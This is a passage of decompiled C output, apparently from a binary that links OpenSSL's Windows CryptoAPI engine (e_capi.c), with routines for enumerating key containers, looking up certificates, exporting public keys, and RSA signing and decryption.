  sub_41D710(a1, dword_53167C, 0);
  return 1;
}
// 53167C: using guessed type int dword_53167C;

//----- (0043E8F0) --------------------------------------------------------
int __cdecl sub_43E8F0(int a1, int a2)
{
  const WCHAR *v2; // edi
  const CHAR *v3; // eax
  int v4; // ebx
  void *v5; // esp
  int v6; // eax
  int LastError; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  DWORD v12; // eax
  BYTE *v13; // esi
  int v14; // eax
  int i; // edi
  int v16; // edi
  int v17; // eax
  const char *v18; // [esp-8h] [ebp-28h]
  int v19; // [esp-4h] [ebp-24h]
  WCHAR v20[6]; // [esp+0h] [ebp-20h] BYREF
  int v21; // [esp+Ch] [ebp-14h]
  HCRYPTPROV phProv; // [esp+10h] [ebp-10h] BYREF
  DWORD v23; // [esp+14h] [ebp-Ch] BYREF
  DWORD pdwDataLen; // [esp+18h] [ebp-8h] BYREF

  v19 = *(_DWORD *)(a1 + 16);
  v18 = *(const char **)(a1 + 12);
  v2 = 0;
  v21 = 1;
  pdwDataLen = 0;
  sub_43E250((const CHAR *)a1, "Listing containers CSP=%s, type = %d\n", v18, v19);
  v3 = *(const CHAR **)(a1 + 12);
  if ( v3 )
  {
    v4 = MultiByteToWideChar(0, 0, v3, -1, 0, 0);
    v23 = v4;
    if ( !v4 || (v5 = alloca(2 * v4), v2 = v20, MultiByteToWideChar(0, 0, *(LPCCH *)(a1 + 12), -1, v20, v4), !v20) )
    {
      v6 = dword_539190;
      if ( !dword_539190 )
      {
        v6 = sub_408040();
        dword_539190 = v6;
      }
      sub_408310(v6, 107, 65, (int)"engines\\e_capi.c", 1202);
LABEL_7:
      LastError = GetLastError();
      sub_43E270(LastError);
      return 0;
    }
  }
  if ( !CryptAcquireContextW(&phProv, 0, v2, *(_DWORD *)(a1 + 16), 0xF0000000) )
  {
    v9 = dword_539190;
    if ( !dword_539190 )
    {
      v9 = sub_408040();
      dword_539190 = v9;
    }
    sub_408310(v9, 107, 103, (int)"engines\\e_capi.c", 1211);
    goto LABEL_7;
  }
  if ( !CryptGetProvParam(phProv, 2u, 0, &pdwDataLen, 1u) )
  {
    v10 = dword_539190;
    if ( !dword_539190 )
    {
      v10 = sub_408040();
      dword_539190 = v10;
    }
    sub_408310(v10, 107, 107, (int)"engines\\e_capi.c", 1217);
    v11 = GetLastError();
    sub_43E270(v11);
    CryptReleaseContext(phProv, 0);
    return 0;
  }
  sub_43E250((const CHAR *)a1, "Got max container len %d\n", pdwDataLen);
  v12 = pdwDataLen;
  if ( !pdwDataLen )
  {
    v12 = 1024;
    pdwDataLen = 1024;
  }
  v13 = (BYTE *)sub_4133F0(v12);
  if ( v13 )
  {
    for ( i = 0; ; ++i )
    {
      v23 = pdwDataLen;
      *v13 = 0;
      if ( !CryptGetProvParam(phProv, 2u, v13, &v23, i == 0) )
        break;
      sub_43E250((const CHAR *)a1, "Container name %s, len=%d, index=%d, flags=%d\n", (const char *)v13, v23, i, i == 0);
      if ( !*v13 && v23 == pdwDataLen )
      {
        sub_43E250((const CHAR *)a1, "Enumerate bug: using workaround\n");
        goto LABEL_33;
      }
      sub_419190(a2, "%lu. %s\n", i, (const char *)v13);
    }
    v16 = GetLastError();
    if ( v16 != 259 )
    {
      v17 = dword_539190;
      if ( !dword_539190 )
      {
        v17 = sub_408040();
        dword_539190 = v17;
      }
      sub_408310(v17, 107, 107, (int)"engines\\e_capi.c", 1244);
      sub_43E270(v16);
      v21 = 0;
    }
  }
  else
  {
    v14 = dword_539190;
    if ( !dword_539190 )
    {
      v14 = sub_408040();
      dword_539190 = v14;
    }
    sub_408310(v14, 107, 65, (int)"engines\\e_capi.c", 1227);
    v21 = 0;
  }
LABEL_33:
  sub_413490(v13);
  CryptReleaseContext(phProv, 0);
  return v21;
}
// 539190: using guessed type int dword_539190;

//----- (0043EBC0) --------------------------------------------------------
BOOL __usercall sub_43EBC0@<eax>(const CERT_CONTEXT *a1@<edi>)
{
  BOOL result; // eax
  void *v2; // eax
  void *v3; // esi
  int v4; // eax
  int v5; // eax
  int LastError; // eax
  DWORD pcbData; // [esp+4h] [ebp-4h] BYREF

  result = CertGetCertificateContextProperty(a1, 2u, 0, &pcbData);
  if ( result )
  {
    v2 = sub_4133F0(pcbData);
    v3 = v2;
    if ( v2 )
    {
      if ( CertGetCertificateContextProperty(a1, 2u, v2, &pcbData) )
      {
        return (BOOL)v3;
      }
      else
      {
        v5 = dword_539190;
        if ( !dword_539190 )
        {
          v5 = sub_408040();
          dword_539190 = v5;
        }
        sub_408310(v5, 105, 109, (int)"engines\\e_capi.c", 1283);
        LastError = GetLastError();
        sub_43E270(LastError);
        sub_413490(v3);
        return 0;
      }
    }
    else
    {
      v4 = dword_539190;
      if ( !dword_539190 )
      {
        v4 = sub_408040();
        dword_539190 = v4;
      }
      sub_408310(v4, 105, 65, (int)"engines\\e_capi.c", 1277);
      return 0;
    }
  }
  return result;
}
// 539190: using guessed type int dword_539190;

//----- (0043ECA0) --------------------------------------------------------
BOOL __fastcall sub_43ECA0(const CERT_CONTEXT *a1, const CHAR *a2)
{
  BOOL result; // eax
  WCHAR *v4; // eax
  WCHAR *v5; // esi
  CHAR *v6; // edi
  int v7; // eax
  int LastError; // eax
  DWORD pcbData; // [esp+8h] [ebp-4h] BYREF

  sub_43E250(a2, "capi_cert_get_fname\n");
  result = CertGetCertificateContextProperty(a1, 0xBu, 0, &pcbData);
  if ( result )
  {
    v4 = (WCHAR *)sub_4133F0(pcbData);
    v5 = v4;
    if ( v4 )
    {
      if ( CertGetCertificateContextProperty(a1, 0xBu, v4, &pcbData) )
      {
        v6 = sub_43E2C0(v5);
        sub_413490(v5);
        return (BOOL)v6;
      }
      v7 = dword_539190;
      if ( !dword_539190 )
      {
        v7 = sub_408040();
        dword_539190 = v7;
      }
      sub_408310(v7, 99, 108, (int)"engines\\e_capi.c", 1332);
      LastError = GetLastError();
      sub_43E270(LastError);
      sub_413490(v5);
    }
    return 0;
  }
  return result;
}
// 539190: using guessed type int dword_539190;

//----- (0043ED80) --------------------------------------------------------
void __fastcall sub_43ED80(const CERT_CONTEXT *a1, int a2, int a3)
{
  const char *v4; // eax
  char *v5; // esi
  unsigned int **v6; // ebx
  int *v7; // eax
  int *v8; // eax
  void *v9; // esi
  int cbCertEncoded; // [esp-4h] [ebp-1Ch]
  int v11; // [esp+10h] [ebp-8h]
  BYTE *pbCertEncoded; // [esp+14h] [ebp-4h] BYREF

  v11 = *(_DWORD *)(a2 + 36);
  if ( (v11 & 2) != 0 )
  {
    v4 = (const char *)sub_43ECA0(a1, (const CHAR *)a2);
    v5 = (char *)v4;
    if ( v4 )
    {
      sub_419190(a3, "  Friendly Name \"%s\"\n", v4);
      sub_413490(v5);
    }
    else
    {
      sub_419190(a3, "  <No Friendly Name>\n");
    }
  }
  cbCertEncoded = a1->cbCertEncoded;
  pbCertEncoded = a1->pbCertEncoded;
  v6 = (unsigned int **)sub_4334E0(0, (void **)&pbCertEncoded, cbCertEncoded);
  if ( !v6 )
    sub_419190(a3, "  <Can't parse certificate>\n");
  if ( (v11 & 1) != 0 )
  {
    sub_419190(a3, "  Subject: ");
    v7 = (int *)sub_432E80((int)v6);
    sub_445220(a3, v7, 0, 8520479);
    sub_419190(a3, "\n  Issuer: ");
    v8 = (int *)sub_432E70((int)v6);
    sub_445220(a3, v8, 0, 8520479);
    sub_419190(a3, "\n");
  }
  if ( (v11 & 4) != 0 )
    sub_462440(a3, v6, 8520479, 0);
  if ( (v11 & 0x20) != 0 )
  {
    v9 = (void *)sub_43EBC0(a1);
    sub_43E600((int)v9, a3);
    sub_413490(v9);
  }
  if ( (v11 & 8) != 0 )
    sub_462010(a3, (int)v6);
  sub_433520((int)v6);
}

//----- (0043EED0) --------------------------------------------------------
HCERTSTORE __usercall sub_43EED0@<eax>(const char *pvPara@<ecx>, int a2@<edi>)
{
  const char *v2; // esi
  HCERTSTORE v3; // esi
  int v4; // eax
  int LastError; // eax

  v2 = pvPara;
  if ( !pvPara )
  {
    v2 = *(const char **)(a2 + 20);
    if ( !v2 )
      v2 = "MY";
  }
  sub_43E250((const CHAR *)a2, "Opening certificate store %s\n", v2);
  v3 = CertOpenStore((LPCSTR)9, 0, 0, *(_DWORD *)(a2 + 28), v2);
  if ( !v3 )
  {
    v4 = dword_539190;
    if ( !dword_539190 )
    {
      v4 = sub_408040();
      dword_539190 = v4;
    }
    sub_408310(v4, 109, 110, (int)"engines\\e_capi.c", 1393);
    LastError = GetLastError();
    sub_43E270(LastError);
  }
  return v3;
}
// 539190: using guessed type int dword_539190;

//----- (0043EF50) --------------------------------------------------------
PCCERT_CONTEXT __cdecl sub_43EF50(int a1, void *pvFindPara, HCERTSTORE hCertStore)
{
  const CERT_CONTEXT *v4; // edi
  char *v5; // eax
  BOOL v6; // esi

  if ( *(_DWORD *)(a1 + 32) == 1 )
    return CertFindCertificateInStore(hCertStore, 1u, 0, 0x70007u, pvFindPara, 0);
  if ( *(_DWORD *)(a1 + 32) != 2 )
    return 0;
  v4 = CertEnumCertificatesInStore(hCertStore, 0);
  if ( !v4 )
    return 0;
  while ( 1 )
  {
    v5 = (char *)sub_43ECA0(v4, (const CHAR *)a1);
    if ( v5 )
    {
      v6 = strcmp(v5, (const char *)pvFindPara) == 0;
      sub_413490(v5);
      if ( v6 )
        break;
    }
    v4 = CertEnumCertificatesInStore(hCertStore, v4);
    if ( !v4 )
      return 0;
  }
  return v4;
}

//----- (0043F010) --------------------------------------------------------
HCRYPTPROV *__cdecl sub_43F010(int a1, const char *szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwKeySpec)
{
  HCRYPTPROV *v5; // ebx
  CHAR *v7; // esi
  CHAR *v8; // edi
  HCRYPTPROV *v9; // esi
  int v10; // eax
  int LastError; // eax
  int v12; // eax
  int v13; // eax
  DWORD dwFlags; // [esp+Ch] [ebp-4h]

  dwFlags = 0;
  v5 = (HCRYPTPROV *)sub_4133F0(0x10u);
  if ( !v5 )
    return 0;
  if ( dwProvType == 1 && dword_53919C )
  {
    szProvider = 0;
    dwProvType = 24;
    sub_43E250((const CHAR *)a1, "capi_get_key, contname=%s, RSA_AES_CSP\n", szContainer);
  }
  else if ( a1 && *(int *)a1 >= 2 && *(_DWORD *)(a1 + 4) )
  {
    v7 = sub_43E2C0((LPCWCH)szContainer);
    v8 = sub_43E2C0(szProvider);
    sub_43E250((const CHAR *)a1, "capi_get_key, contname=%s, provname=%s, type=%d\n", v7, v8, dwProvType);
    sub_413490(v8);
    sub_413490(v7);
  }
  if ( (*(_DWORD *)(a1 + 28) & 0x20000) != 0 )
    dwFlags = 32;
  v9 = v5 + 1;
  if ( !CryptAcquireContextW(v5 + 1, (LPCWSTR)szContainer, szProvider, dwProvType, dwFlags) )
  {
    v10 = dword_539190;
    if ( !dword_539190 )
    {
      v10 = sub_408040();
      dword_539190 = v10;
    }
    sub_408310(v10, 103, 103, (int)"engines\\e_capi.c", 1498);
    LastError = GetLastError();
    sub_43E270(LastError);
LABEL_20:
    sub_413490(v5);
    return 0;
  }
  if ( !CryptGetUserKey(*v9, dwKeySpec, v5 + 2) )
  {
    v12 = dword_539190;
    if ( !dword_539190 )
    {
      v12 = sub_408040();
      dword_539190 = v12;
    }
    sub_408310(v12, 103, 113, (int)"engines\\e_capi.c", 1503);
    v13 = GetLastError();
    sub_43E270(v13);
    CryptReleaseContext(*v9, 0);
    goto LABEL_20;
  }
  v5[3] = dwKeySpec;
  *v5 = 0;
  return v5;
}
// 539190: using guessed type int dword_539190;
// 53919C: using guessed type int dword_53919C;

//----- (0043F1D0) --------------------------------------------------------
HCRYPTPROV *__usercall sub_43F1D0@<eax>(const CERT_CONTEXT *a1@<edi>, int a2)
{
  HCRYPTPROV *v2; // ebx
  const char **v3; // eax
  const char **v4; // esi

  v2 = 0;
  v3 = (const char **)sub_43EBC0(a1);
  v4 = v3;
  if ( v3 )
    v2 = sub_43F010(a2, *v3, (LPCWSTR)v3[1], (DWORD)v3[2], (DWORD)v3[6]);
  sub_413490(v4);
  sub_413490(0);
  sub_413490(0);
  return v2;
}

//----- (0043F240) --------------------------------------------------------
HCRYPTPROV *__cdecl sub_43F240(int a1, CHAR *lpMultiByteStr)
{
  int v2; // eax
  int v3; // edi
  void *v4; // esp
  int v5; // edi
  void *v6; // esp
  HCRYPTPROV *result; // eax
  HCRYPTPROV *v8; // ebx
  const CERT_CONTEXT *v9; // edi
  WCHAR v10[6]; // [esp+0h] [ebp-1Ch] BYREF
  LPCWSTR szContainer; // [esp+Ch] [ebp-10h]
  LPCWSTR szProvider; // [esp+10h] [ebp-Ch]
  HCRYPTPROV *v13; // [esp+14h] [ebp-8h]

  v2 = *(_DWORD *)(a1 + 32);
  v13 = 0;
  if ( v2 > 0 )
  {
    if ( v2 <= 2 )
    {
      result = (HCRYPTPROV *)sub_43EED0(0, a1);
      v8 = result;
      if ( !result )
        return result;
      v9 = sub_43EF50(a1, lpMultiByteStr, result);
      if ( v9 )
      {
        v13 = sub_43F1D0(v9, a1);
        CertFreeCertificateContext(v9);
      }
      CertCloseStore(v8, 0);
    }
    else if ( v2 == 3 )
    {
      v3 = MultiByteToWideChar(0, 0, lpMultiByteStr, -1, 0, 0);
      if ( v3 )
      {
        v4 = alloca(2 * v3);
        szContainer = v10;
        if ( MultiByteToWideChar(0, 0, lpMultiByteStr, -1, v10, v3) )
        {
          v5 = MultiByteToWideChar(0, 0, *(LPCCH *)(a1 + 12), -1, 0, 0);
          if ( v5 )
          {
            v6 = alloca(2 * v5);
            szProvider = v10;
            if ( MultiByteToWideChar(0, 0, *(LPCCH *)(a1 + 12), -1, v10, v5) )
              return sub_43F010(a1, (const char *)szContainer, szProvider, *(_DWORD *)(a1 + 16), *(_DWORD *)(a1 + 8));
          }
        }
      }
    }
  }
  return v13;
}

//----- (0043F390) --------------------------------------------------------
_DWORD *sub_43F390()
{
  _DWORD *result; // eax
  int v1; // eax

  result = sub_413430(0x34u);
  if ( result )
  {
    result[4] = 1;
    result[9] = 3;
    result[2] = 1;
    result[7] = 114688;
    result[8] = 1;
    result[10] = sub_43C2A0;
  }
  else
  {
    v1 = dword_539190;
    if ( !dword_539190 )
    {
      v1 = sub_408040();
      dword_539190 = v1;
    }
    sub_408310(v1, 101, 65, (int)"engines\\e_capi.c", 1612);
    return 0;
  }
  return result;
}
// 539190: using guessed type int dword_539190;

//----- (0043F400) --------------------------------------------------------
int __usercall sub_43F400@<eax>(const char *a1@<ebx>, const CHAR *a2, DWORD dwProvType, int a4)
{
  const CHAR *v4; // esi
  int v5; // esi
  void *v6; // esp
  void *v7; // edi
  int v8; // eax
  int v10; // eax
  int LastError; // eax
  WCHAR v12[4]; // [esp+0h] [ebp-10h] BYREF
  HCRYPTPROV phProv; // [esp+8h] [ebp-8h] BYREF

  v4 = a2;
  sub_43E250(a2, "capi_ctx_set_provname, name=%s, type=%d\n", a1, dwProvType);
  if ( !a4 )
  {
LABEL_6:
    v7 = sub_4247B0(a1);
    if ( v7 )
    {
      sub_413490(*((void **)v4 + 3));
      *((_DWORD *)v4 + 3) = v7;
      *((_DWORD *)v4 + 4) = dwProvType;
      return 1;
    }
    else
    {
      v8 = dword_539190;
      if ( !dword_539190 )
      {
        v8 = sub_408040();
        dword_539190 = v8;
      }
      sub_408310(v8, 102, 65, (int)"engines\\e_capi.c", 1667);
      return 0;
    }
  }
  v5 = MultiByteToWideChar(0, 0, a1, -1, 0, 0);
  if ( v5 )
  {
    v6 = alloca(2 * v5);
    MultiByteToWideChar(0, 0, a1, -1, v12, v5);
    if ( v12 )
    {
      if ( CryptAcquireContextW(&phProv, 0, v12, dwProvType, 0xF0000000) )
      {
        CryptReleaseContext(phProv, 0);
        v4 = a2;
        goto LABEL_6;
      }
    }
  }
  v10 = dword_539190;
  if ( !dword_539190 )
  {
    v10 = sub_408040();
    dword_539190 = v10;
  }
  sub_408310(v10, 102, 103, (int)"engines\\e_capi.c", 1659);
  LastError = GetLastError();
  sub_43E270(LastError);
  return 0;
}
// 539190: using guessed type int dword_539190;

//----- (0043F580) --------------------------------------------------------
int __fastcall sub_43F580(DWORD a1, const CHAR *a2)
{
  void *v4; // ebx
  int v5; // esi
  DWORD v6; // [esp+8h] [ebp-8h] BYREF
  void *Block; // [esp+Ch] [ebp-4h] BYREF

  if ( sub_43E3D0(a1, &v6, a2, (const char **)&Block) != 1 )
    return 0;
  v4 = Block;
  v5 = sub_43F400((const char *)Block, a2, v6, 0);
  sub_413490(v4);
  return v5;
}

//----- (0043F5E0) --------------------------------------------------------
_DWORD *__cdecl sub_43F5E0(_DWORD *a1)
{
  int v1; // ecx
  int v2; // esi
  int v3; // eax
  int LastError; // eax
  int *v6; // ebx
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // esi
  _BYTE *v11; // edi
  void **v12; // ebx
  void **v13; // ebp
  void **v14; // eax
  _BYTE *v15; // edi
  _BYTE *v16; // edi
  int v17; // eax
  void **v18; // esi
  void **v19; // eax
  void **v20; // ebp
  _DWORD *v21; // eax
  HCRYPTKEY v22; // [esp-18h] [ebp-58h]
  void ***v23; // [esp+10h] [ebp-30h]
  void ***v24; // [esp+14h] [ebp-2Ch]
  _DWORD *v25; // [esp+18h] [ebp-28h]
  void **v26; // [esp+1Ch] [ebp-24h]
  void **Block; // [esp+20h] [ebp-20h]
  int *v28; // [esp+24h] [ebp-1Ch]
  DWORD pdwDataLen; // [esp+28h] [ebp-18h] BYREF
  int v30; // [esp+2Ch] [ebp-14h]
  char v31[12]; // [esp+30h] [ebp-10h] BYREF

  v2 = v1;
  v22 = *(_DWORD *)(v1 + 8);
  v30 = v1;
  v24 = 0;
  v23 = 0;
  v25 = 0;
  if ( !CryptExportKey(v22, 0, 6u, 0, 0, &pdwDataLen) )
  {
    v3 = dword_539190;
    if ( !dword_539190 )
    {
      v3 = sub_408040();
      dword_539190 = v3;
    }
    sub_408310(v3, 115, 117, (int)"engines\\e_capi.c", 643);
    LastError = GetLastError();
    sub_43E270(LastError);
    return 0;
  }
  v6 = (int *)sub_4133F0(pdwDataLen);
  v28 = v6;
  if ( !v6 )
    goto LABEL_30;
  if ( !CryptExportKey(*(_DWORD *)(v2 + 8), 0, 6u, 0, (BYTE *)v6, &pdwDataLen) )
  {
    v7 = dword_539190;
    if ( !dword_539190 )
    {
      v7 = sub_408040();
      dword_539190 = v7;
    }
    sub_408310(v7, 115, 116, (int)"engines\\e_capi.c", 654);
    v8 = GetLastError();
    sub_43E270(v8);
    goto LABEL_33;
  }
  if ( *(_BYTE *)v6 == 6 )
  {
    v9 = v6[1];
    if ( v9 == 9216 || v9 == 41984 )
    {
      if ( v6[2] != 826364754 )
      {
        sub_4191B0((int)v31, 10, "%lx", v6[2]);
        sub_43E0B0(115, 123, (int)"engines\\e_capi.c", 674);
        sub_408610(2, "magic=0x", v31);
        goto LABEL_33;
      }
      v24 = (void ***)sub_4057D0(a1);
      if ( v24 )
      {
        v18 = (void **)sub_4168C0();
        v19 = (void **)sub_4168C0();
        v20 = v19;
        if ( v18 && v19 )
        {
          sub_405760(v24, v19, v18, 0);
          if ( sub_417490(v18, v6[4]) )
          {
            if ( sub_43E160((_BYTE *)v6 + 20, (int)v20, (unsigned int)v6[3] >> 3) )
            {
              sub_405720((int)v24, dword_531678, v30);
              v21 = sub_41CB00();
              v25 = v21;
              if ( v21 )
              {
                sub_41CE20((int)v21, (void *)6, (int)v24);
                v24 = 0;
                goto LABEL_33;
              }
            }
          }
        }
        else
        {
          sub_417060(v18);
          sub_417060(v20);
        }
      }
    }
    else
    {
      if ( v9 != 8704 )
      {
        sub_4191B0((int)v31, 10, "%ux", v6[1]);
        sub_43E0B0(115, 121, (int)"engines\\e_capi.c", 767);
        sub_408610(2, "aiKeyAlg=0x", v31);
        goto LABEL_33;
      }
      if ( v6[2] != 827544388 )
      {
        sub_4191B0((int)v31, 10, "%lx", v6[2]);
        sub_43E0B0(115, 122, (int)"engines\\e_capi.c", 720);
        sub_408610(2, "magic=0x", v31);
        goto LABEL_33;
      }
      v10 = (unsigned int)v6[3] >> 3;
      v11 = v6 + 4;
      v23 = (void ***)sub_41D9B0(a1);
      if ( v23 )
      {
        v12 = (void **)sub_4168C0();
        v13 = (void **)sub_4168C0();
        Block = (void **)sub_4168C0();
        v14 = (void **)sub_4168C0();
        v26 = v14;
        if ( v12 && v13 && Block && v14 )
        {
          sub_41D8C0(v23, v12, v13, Block);
          sub_41D940((int)v23, (int)v26, 0);
          if ( sub_43E160(v11, (int)v12, v10) )
          {
            v15 = &v11[v10];
            if ( sub_43E160(v15, (int)v13, 20) )
            {
              v16 = v15 + 20;
              if ( sub_43E160(v16, (int)Block, v10) )
              {
                if ( sub_43E160(&v16[v10], (int)v26, v10) )
                {
                  sub_41D710((int)v23, dword_53167C, v30);
                  v25 = sub_41CB00();
                  if ( v25 )
                  {
                    sub_41CE20((int)v25, (void *)0x74, (int)v23);
                    v6 = v28;
                    v23 = 0;
                    goto LABEL_33;
                  }
                }
              }
            }
          }
        }
        else
        {
          sub_417060(v12);
          sub_417060(v13);
          sub_417060(Block);
          sub_417060(v26);
        }
        v6 = v28;
      }
    }
LABEL_30:
    v17 = dword_539190;
    if ( !dword_539190 )
    {
      v17 = sub_408040();
      dword_539190 = v17;
    }
    sub_408310(v17, 115, 65, (int)"engines\\e_capi.c", 784);
    goto LABEL_33;
  }
  sub_43E0B0(115, 115, (int)"engines\\e_capi.c", 661);
LABEL_33:
  sub_413490(v6);
  if ( !v25 )
  {
    sub_405630((volatile LONG *)v24);
    sub_41D610((volatile LONG *)v23);
  }
  return v25;
}
// 43F60C: variable 'v1' is possibly undefined
// 531678: using guessed type int dword_531678;
// 53167C: using guessed type int dword_53167C;
// 539190: using guessed type int dword_539190;

//----- (0043FA90) --------------------------------------------------------
HCRYPTPROV *__cdecl sub_43FA90(_DWORD *a1, CHAR *lpMultiByteStr)
{
  int v2; // eax
  int v3; // eax
  HCRYPTPROV *result; // eax
  PCCERT_CONTEXT *v5; // esi
  _DWORD *v6; // edi

  v2 = sub_42A0E0((int)a1, dword_531674);
  if ( v2 )
  {
    result = sub_43F240(v2, lpMultiByteStr);
    v5 = (PCCERT_CONTEXT *)result;
    if ( result )
    {
      v6 = sub_43F5E0(a1);
      if ( !v6 )
        sub_43E690(v5);
      return v6;
    }
  }
  else
  {
    v3 = dword_539190;
    if ( !dword_539190 )
    {
      v3 = sub_408040();
      dword_539190 = v3;
    }
    sub_408310(v3, 108, 100, (int)"engines\\e_capi.c", 798);
    return 0;
  }
  return result;
}
// 531674: using guessed type int dword_531674;
// 539190: using guessed type int dword_539190;

//----- (0043FB10) --------------------------------------------------------
int __cdecl sub_43FB10(int a1, BYTE *pbData, int a3, BYTE *pbSignature, DWORD *a5, int a6)
{
  int v6; // eax
  const CHAR *v7; // eax
  int v8; // ebx
  int v9; // eax
  ALG_ID v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int LastError; // eax
  DWORD v18; // ecx
  DWORD v19; // eax
  BYTE *v20; // esi
  BYTE v21; // dl
  int v22; // [esp-4h] [ebp-34h]
  DWORD pdwSigLen; // [esp+10h] [ebp-20h] BYREF
  HCRYPTHASH phHash; // [esp+14h] [ebp-1Ch] BYREF
  int v25; // [esp+18h] [ebp-18h]
  DWORD *v26; // [esp+1Ch] [ebp-14h]
  char v27[12]; // [esp+20h] [ebp-10h] BYREF

  v22 = dword_531674;
  v26 = a5;
  v25 = -1;
  v6 = sub_407400(a6);
  v7 = (const CHAR *)sub_42A0E0(v6, v22);
  sub_43E250(v7, "Called CAPI_rsa_sign()\n");
  v8 = sub_405730(a6, dword_531678);
  if ( !v8 )
  {
    v9 = dword_539190;
    if ( !dword_539190 )
    {
      v9 = sub_408040();
      dword_539190 = v9;
    }
    sub_408310(v9, 112, 101, (int)"engines\\e_capi.c", 841);
    return -1;
  }
  if ( a1 > 672 )
  {
    if ( a1 == 673 )
    {
      v11 = 32781;
    }
    else
    {
      if ( a1 != 674 )
        goto LABEL_16;
      v11 = 32782;
    }
LABEL_21:
    if ( CryptCreateHash(*(_DWORD *)(v8 + 4), v11, 0, 0, &phHash) )
    {
      if ( CryptSetHashParam(phHash, 2u, pbData, 0) )
      {
        pdwSigLen = sub_4070E0(a6);
        if ( CryptSignHashW(phHash, *(_DWORD *)(v8 + 12), 0, 0, pbSignature, &pdwSigLen) )
        {
          v18 = pdwSigLen;
          v19 = 0;
          v25 = 1;
          if ( (pdwSigLen & 0xFFFFFFFE) != 0 )
          {
            v20 = pbSignature;
            do
            {
              v21 = pbSignature[v19];
              pbSignature[v19] = v20[v18 - 1];
              v20[v18 - 1] = v21;
              v18 = pdwSigLen;
              ++v19;
              --v20;
            }
            while ( v19 < pdwSigLen >> 1 );
          }
          *v26 = v18;
        }
        else
        {
          sub_43E0B0(112, 111, (int)"engines\\e_capi.c", 896);
          LastError = GetLastError();
          sub_43E270(LastError);
        }
      }
      else
      {
        v15 = dword_539190;
        if ( !dword_539190 )
        {
          v15 = sub_408040();
          dword_539190 = v15;
        }
        sub_408310(v15, 112, 102, (int)"engines\\e_capi.c", 888);
        v16 = GetLastError();
        sub_43E270(v16);
      }
      CryptDestroyHash(phHash);
      return v25;
    }
    else
    {
      v13 = dword_539190;
      if ( !dword_539190 )
      {
        v13 = sub_408040();
        dword_539190 = v13;
      }
      sub_408310(v13, 112, 99, (int)"engines\\e_capi.c", 881);
      v14 = GetLastError();
      sub_43E270(v14);
      return -1;
    }
  }
  switch ( a1 )
  {
    case 672:
      v11 = 32780;
      goto LABEL_21;
    case 4:
      v11 = 32771;
      goto LABEL_21;
    case 64:
      v11 = 32772;
      goto LABEL_21;
    case 114:
      v11 = 32776;
      goto LABEL_21;
  }
LABEL_16:
  sub_4191B0((int)v27, 10, "%x", a1);
  v12 = dword_539190;
  if ( !dword_539190 )
  {
    v12 = sub_408040();
    dword_539190 = v12;
  }
  sub_408310(v12, 112, 119, (int)"engines\\e_capi.c", 873);
  sub_408610(2, "NID=0x", v27);
  return -1;
}
// 531674: using guessed type int dword_531674;
// 531678: using guessed type int dword_531678;
// 539190: using guessed type int dword_539190;

//----- (0043FDF0) --------------------------------------------------------
int __cdecl sub_43FDF0(int Size, int a2, void *a3, int a4, int a5)
{
  int v6; // eax
  const CHAR *v7; // eax
  int v8; // ebx
  int v9; // eax
  int v10; // eax
  char *v11; // edi
  signed int v12; // eax
  char *v13; // ecx
  int v14; // eax
  int LastError; // eax
  DWORD v16; // esi
  int v17; // [esp-8h] [ebp-28h]
  DWORD pdwDataLen; // [esp+8h] [ebp-18h] BYREF
  void *v19; // [esp+Ch] [ebp-14h]
  char v20[12]; // [esp+10h] [ebp-10h] BYREF

  v19 = a3;
  if ( Size <= 0 )
    return Size;
  v17 = dword_531674;
  v6 = sub_407400(a4);
  v7 = (const CHAR *)sub_42A0E0(v6, v17);
  sub_43E250(v7, "Called capi_rsa_priv_dec()\n");
  v8 = sub_405730(a4, dword_531678);
  if ( v8 )
  {
    if ( a5 == 1 )
    {
      v11 = (char *)sub_4133F0(Size);
      if ( v11 )
      {
        v12 = 0;
        v13 = &v11[Size - 1];
        do
        {
          *v13 = *(_BYTE *)(v12 + a2);
          ++v12;
          --v13;
        }
        while ( v12 < Size );
        pdwDataLen = Size;
        if ( CryptDecrypt(*(_DWORD *)(v8 + 8), 0, 1, 0, (BYTE *)v11, &pdwDataLen) )
        {
          v16 = pdwDataLen;
          memcpy(v19, v11, pdwDataLen);
          sub_413490(v11);
          return v16;
        }
        else
        {
          v14 = dword_539190;
          if ( !dword_539190 )
          {
            v14 = sub_408040();
            dword_539190 = v14;
          }
          sub_408310(v14, 110, 105, (int)"engines\\e_capi.c", 960);
          LastError = GetLastError();
          sub_43E270(LastError);
          sub_413490(v11);
          return -1;
        }
      }
      else
      {
        sub_43E0B0(110, 65, (int)"engines\\e_capi.c", 951);
        return -1;
      }
    }
    else
    {
      sub_4191B0((int)v20, 10, "%d", a5);
      v10 = dword_539190;
      if ( !dword_539190 )
      {
        v10 = sub_408040();
        dword_539190 = v10;
      }
      sub_408310(v10, 110, 120, (int)"engines\\e_capi.c", 944);
      sub_408610(2, "padding=", v20);
      return -1;
    }
  }
  else
  {
    v9 = dword_539190;
    if ( !dword_539190 )
    {
      v9 = sub_408040();
      dword_539190 = v9;
    }
    sub_408310(v9, 110, 101, (int)"engines\\e_capi.c", 937);
    return -1;
  }
}
// 43FF5C: conditional instruction was optimized away because %Size.4>=1
// 531674: using guessed type int dword_531674;
// 531678: using guessed type int dword_531678;
// 539190: using guessed type int dword_539190;

//----- (00440030) --------------------------------------------------------
_DWORD **__cdecl sub_440030(BYTE *pbData, int a2, int a3)
{
  _DWORD **v3; // ebp
  int v4; // eax
  const CHAR *v5; // eax
  int v6; // eax
  int v7; // esi
  int v8; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int LastError; // eax
  void **v14; // esi
  void **v15; // eax
  void **v16; // ebx
  _DWORD **v17; // eax
  int v18; // [esp-4h] [ebp-44h]
  HCRYPTHASH phHash; // [esp+Ch] [ebp-34h] BYREF
  DWORD pdwSigLen; // [esp+10h] [ebp-30h] BYREF
  BYTE pbSignature[20]; // [esp+14h] [ebp-2Ch] BYREF
  char v22[20]; // [esp+28h] [ebp-18h] BYREF

  v18 = dword_531674;
  v3 = 0;
  v4 = sub_41D990(a3);
  v5 = (const CHAR *)sub_42A0E0(v4, v18);
  sub_43E250(v5, "Called CAPI_dsa_do_sign()\n");
  v6 = sub_41D720(a3, dword_53167C);
  v7 = v6;
  if ( !v6 )
  {
    v8 = dword_539190;
    if ( !dword_539190 )
    {
      v8 = sub_408040();
